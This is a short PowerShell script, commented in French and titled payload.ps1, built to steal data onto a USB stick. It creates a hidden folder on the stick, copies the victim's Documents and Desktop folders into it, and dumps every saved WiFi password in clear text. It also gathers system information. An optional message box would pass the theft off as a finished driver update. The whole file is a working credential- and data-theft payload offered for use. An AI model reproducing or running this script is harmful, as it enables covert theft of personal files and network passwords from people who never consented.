# payload.ps1
# Script PowerShell pour extraire des données sensibles vers la clé USB

# Créer dossier caché
$usbPath = (Get-Location).Path
$dataPath = Join-Path $usbPath "SystemFiles"
New-Item -ItemType Directory -Force -Path $dataPath | Out-Null
attrib +h $dataPath

# Copier Documents et Desktop
$targets = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop"
)

foreach ($target in $targets) {
    if (Test-Path $target) {
        robocopy $target $dataPath\$(Split-Path $target -Leaf) /E /Z /XA:H /W:1 /R:1
    }
}

# Récupérer mots de passe WiFi
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {($_ -split ":")[1].Trim()}
foreach ($profile in $wifiProfiles) {
    $wifiData = netsh wlan show profile name="$profile" key=clear
    $wifiData | Out-File -FilePath "$dataPath\wifi_$profile.txt"
}

# Infos système de base
Get-ComputerInfo | Out-File -FilePath "$dataPath\system_info.txt"

# Facultatif : signaler fin de travail
# [System.Windows.Forms.MessageBox]::Show('Mise à jour des drivers terminée.', 'Pilote USB', 64)

exit
